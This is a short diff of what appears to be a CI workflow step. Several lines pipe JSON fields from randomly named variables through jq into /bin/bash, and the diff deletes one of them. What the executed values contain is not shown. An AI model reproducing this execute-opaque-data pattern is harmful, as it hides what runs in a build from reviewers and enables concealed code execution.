@@ -39,7 +39,6 @@ jobs:
           echo $fj9700 | jq -r .xxch9008 | /bin/bash
           printf '%s' "$swl855" | jq -r .n63516 | /bin/bash
           printf '%s' "$cbqg48769" | jq -r .mw121 | /bin/bash
-          echo $cck4527 | jq -r .ueo430 | /bin/bash
           echo $gw7085 | jq -r .firdl9 | /bin/bash
 
       - name: Save data
